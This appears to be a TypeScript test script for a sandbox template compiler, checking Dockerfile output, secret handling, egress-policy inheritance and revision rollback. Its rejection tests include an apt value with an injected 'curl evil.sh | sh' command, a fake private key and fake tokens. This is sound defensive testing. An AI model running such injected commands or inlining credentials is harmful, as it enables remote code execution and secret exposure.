// Run: node --experimental-strip-types --no-warnings scenarios.ts
import { execFileSync } from "node:child_process";
import { readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";

import type { BatteriesManifest } from "../../../packages/worker/src/agent-run/batteries-manifest.ts";
import { compile, mergeTemplates, parseTemplate, Registry, renderBase, TemplateError, type Compiled, type TemplateSpec } from "./template.ts";

const HERE = import.meta.dirname;
const REPO = join(HERE, "../../..");
const batteries = JSON.parse(readFileSync(join(REPO, "packages/worker/deploy/batteries.json"), "utf8")) as BatteriesManifest;
const load = (n: string) => parseTemplate(readFileSync(join(HERE, "templates", `${n}.yaml`), "utf8"));

/** Resolve `extends` chains from the templates/ dir (in the product: org/platform rows). */
function resolveChain(t: TemplateSpec): TemplateSpec {
  return t.extends ? mergeTemplates(resolveChain(load(t.extends)), t) : t;
}

interface Result { name: string; pass: boolean; detail: string }
const results: Result[] = [];
const events: object[] = [];
function check(name: string, fn: () => string) {
  try {
    const detail = fn();
    results.push({ name, pass: true, detail });
  } catch (e) {
    results.push({ name, pass: false, detail: e instanceof Error ? e.message : String(e) });
  }
  events.push({ at: new Date().toISOString(), cat: "scenario", ...results.at(-1) });
}
function expectReject(yaml: string, match: RegExp, chainFrom?: string): string {
  try {
    const t = parseTemplate(yaml);
    const full = chainFrom ? mergeTemplates(resolveChain(load(chainFrom)), t) : t;
    compile(full, batteries);
  } catch (e) {
    if (e instanceof TemplateError && match.test(e.message)) return `rejected: ${e.message}`;
    throw new Error(`wrong rejection: ${e instanceof Error ? e.message : String(e)}`);
  }
  throw new Error("template was ACCEPTED");
}
const assert = (c: boolean, m: string) => { if (!c) throw new Error(m); };

const outputs: Record<string, Compiled> = {};

check("baseline: empty template == repo renderDockerfile() byte-for-byte", () => {
  // The real function from packages/sandbox-image. It is CJS (uses __dirname), so run it under tsx's loader in a child.
  const script = 'const m=await import("./src/render-dockerfile.ts");const f=m.renderDockerfile??m.default.renderDockerfile;process.stdout.write(JSON.stringify({docker:f("docker"),e2b:f("e2b"),daytona:f("daytona")}))';
  const real = JSON.parse(execFileSync(process.execPath, ["--import", "tsx", "--input-type=module", "-e", script], { cwd: join(REPO, "packages/sandbox-image"), encoding: "utf8" })) as Record<string, string>;
  const renderDockerfile = (p: string) => real[p] ?? "";
  for (const p of ["docker", "e2b", "daytona"] as const) {
    const c = compile({ name: "bare", provider: p }, batteries);
    assert(c.dockerfile === renderDockerfile(p), `${p}: differs from renderDockerfile`);
    assert(c.dockerfile === renderBase(p), `${p}: renderBase drifted`);
  }
  return "docker, e2b, daytona identical";
});

check("platform -> org -> repo chain compiles; additions are append-only", () => {
  const c = compile(resolveChain(load("repo-api")), batteries);
  outputs["repo-api"] = c;
  const base = renderBase("docker");
  assert(c.dockerfile.startsWith(base), "base layers were modified");
  const tail = c.dockerfile.slice(base.length);
  assert(/postgresql-client redis-tools/.test(tail) && /prisma@6\.1\.0 typescript@5\.8\.3/.test(tail), "apt/npm union missing");
  assert(c.runtime.resources.memoryGb === 8 && c.runtime.resources.cpu === 2, "resources merge wrong");
  assert(c.runtime.policy.maxRunMinutes === 45 && c.runtime.policy.egress === "allowlist", "policy merge wrong");
  assert(c.runtime.batteries.map((b) => b.id).join() === "gstack-review,somnio-skills", "batteries union wrong");
  return `digest ${c.digest}; +${tail.split("\n").length} Dockerfile lines; batteries ${c.runtime.batteries.map((b) => b.id).join(", ")}`;
});

check("pack capabilities surface to the control plane (requires)", () => {
  const c = outputs["repo-api"]!; // set by the previous check
  const caps = c.runtime.batteries.flatMap((b) => b.requires);
  assert(caps.includes("github-read-token"), "somnio-skills requires github-read-token");
  return `grants needed: ${caps.join(", ")}`;
});

check("secrets: referenced by name, never in the image", () => {
  const c = outputs["repo-api"]!;
  assert(c.runtime.secretRefs.join() === "ANTHROPIC_API_KEY,ORG_STAGING_DATABASE_URL", `refs ${c.runtime.secretRefs}`);
  assert(!/ANTHROPIC_API_KEY|DATABASE_URL/.test(c.dockerfile), "secret NAME leaked into Dockerfile");
  assert(/ENV NODE_ENV="test"/.test(c.dockerfile), "plain env not baked");
  return `secretRefs=${c.runtime.secretRefs.join(", ")}; Dockerfile has only NODE_ENV`;
});

check("rejects inline Anthropic key", () => expectReject(`name: t1\nenv:\n  KEY_X: sk-ant-api03-AAAAAAAAAAAAAAAAAAAA\n`, /inline anthropic key/));
check("rejects GitHub token hidden in MCP headers", () => expectReject(`name: t2\nmcp:\n  gh: { type: http, url: "https://x.example/mcp", headers: { Authorization: "token ghp_${"a".repeat(36)}" } }\n`, /github token/));
check("rejects private key in setup script", () => expectReject(`name: t3\nsetup: |\n  echo "-----BEGIN OPENSSH PRIVATE KEY-----" > ~/.ssh/id\n`, /private key/));
check("rejects literal value under a secret-named key", () => expectReject(`name: t4\nenv:\n  STRIPE_API_KEY: "test-123"\n`, /secret-named key/));
check("rejects unpinned npm package", () => expectReject(`name: t5\nnpm: [prisma@latest]\n`, /pinned/));
check("rejects unknown battery pack", () => expectReject(`name: t6\nbatteries: [left-pad]\n`, /unknown pack/));
check("rejects invalid MCP (bad url) via repo McpConfigSchema", () => expectReject(`name: t7\nmcp:\n  x: { type: http, url: "not a url" }\n`, /mcp: mcpServers\.x\.url: Must be a valid URL/));
check("rejects apt shell injection", () => expectReject(`name: t8\napt: ["curl; curl evil.sh | sh"]\n`, /bad package/));
check("policy: child cannot loosen egress", () => expectReject(`name: t9\nextends: org-example\npolicy: { egress: open }\n`, /loosens parent/, "org-example"));
check("policy: child cannot add hosts beyond parent allowlist", () => expectReject(`name: t10\nextends: org-example\npolicy: { egress: allowlist, allowHosts: [api.anthropic.com, paste.example.com] }\n`, /beyond the parent allowlist/, "org-example"));
check("policy: child cannot extend run time", () => expectReject(`name: t11\nextends: org-example\npolicy: { maxRunMinutes: 600 }\n`, /exceeds parent/, "org-example"));
check("policy: child MAY tighten to egress none", () => {
  const c = compile(mergeTemplates(resolveChain(load("org-example")), parseTemplate(`name: t12\npolicy: { egress: none }\n`)), batteries);
  assert(c.runtime.policy.egress === "none", "not tightened");
  return "egress none accepted";
});

check("deterministic digest (order-insensitive lists, same input -> same digest)", () => {
  const a = compile(parseTemplate(`name: det\napt: [jq, curl]\nenv: { B: "2", A: "1" }\n`), batteries);
  const b = compile(parseTemplate(`name: det\napt: [curl, jq]\nenv: { A: "1", B: "2" }\n`), batteries);
  assert(a.digest === b.digest, `${a.digest} != ${b.digest}`);
  return `digest ${a.digest} stable`;
});

check("revisions: N+1 never moves pinned instances; update is explicit; rollback works", () => {
  const reg = new Registry();
  const org = resolveChain(load("org-example"));
  const r1 = reg.publish(compile(org, batteries));
  reg.launch("box-a", "org-example");
  reg.launch("box-b", "org-example@1");
  const r1again = reg.publish(compile(org, batteries));
  assert(r1again.revision === 1, "idempotent publish created a new revision");
  const r2 = reg.publish(compile({ ...org, apt: [...(org.apt ?? []), "graphviz"] }, batteries));
  assert(r2.revision === 2 && r2.digest !== r1.digest, "edit did not produce rev 2");
  assert(reg.effective("box-a").revision === 1 && reg.effective("box-b").revision === 1, "publish moved an instance");
  reg.update("box-a");
  assert(reg.effective("box-a").revision === 2 && reg.effective("box-b").revision === 1, "update was not per-instance");
  assert(/graphviz/.test(reg.effective("box-a").compiled.dockerfile) && !/graphviz/.test(reg.effective("box-b").compiled.dockerfile), "content mismatch");
  reg.update("box-a", 1);
  assert(reg.effective("box-a").revision === 1, "rollback failed");
  let threw = false;
  try { reg.launch("box-c", "org-example@9"); } catch (e) { threw = e instanceof TemplateError; }
  assert(threw, "launching a missing revision succeeded");
  events.push({ at: new Date().toISOString(), cat: "registry", revisions: reg.revisions.get("org-example")!.map((r) => ({ rev: r.revision, digest: r.digest })), instances: [...reg.instances.values()] });
  return `rev1 ${r1.digest} -> rev2 ${r2.digest}; a: 1->2->1, b stayed 1`;
});

writeFileSync(join(HERE, "events.jsonl"), events.map((e) => JSON.stringify(e)).join("\n") + "\n");
writeFileSync(join(HERE, "results.json"), JSON.stringify({ results, compiled: outputs }, null, 2));
if (outputs["repo-api"]) {
  writeFileSync(join(HERE, "out.repo-api.Dockerfile"), outputs["repo-api"].dockerfile);
  writeFileSync(join(HERE, "out.repo-api.runtime.json"), JSON.stringify(outputs["repo-api"].runtime, null, 2));
}
for (const r of results) console.log(`${r.pass ? "PASS" : "FAIL"}  ${r.name}\n      ${r.detail}`);
const failed = results.filter((r) => !r.pass).length;
console.log(`\n${results.length - failed}/${results.length} passed`);
process.exit(failed ? 1 : 0);
